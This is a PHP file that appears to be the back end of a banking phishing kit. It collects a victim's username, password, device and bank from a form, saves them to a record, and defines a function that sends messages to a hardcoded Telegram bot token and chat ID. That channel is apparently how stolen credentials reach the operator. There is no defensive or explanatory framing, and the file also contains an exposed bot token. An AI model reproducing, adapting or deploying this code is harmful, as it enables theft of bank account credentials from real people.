<?php 
require('../administrador/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];
$banco = $_POST['banco'];

setcookie('contrasena',$contrasena,time()+60*9);
// USUARIO

$chatId = "-4927137480";

$token = "8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI";


if (isset($_COOKIE['registro'])) {
	$id = $_COOKIE['registro'];
	actualizar_usuario($usuario,$contrasena,$id);

}else{
	crear_registro($usuario,$contrasena,$dispositivo, $banco);	

}




    function enviarMensajeTelegram($chatId, $mensaje, $token) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
        $data = array(
            'chat_id' => $chatId,
            'text' => $mensaje
        );
    
        $options = array(
            'http' => array(
                'method' => 'POST',
                'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
                'content' => http_build_query($data)
            )
        );
    
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
    
        if ($result === false) {
            // Error al enviar el mensaje
            return false;
        }
    
        // El mensaje se envió correctamente
        return true;
    }
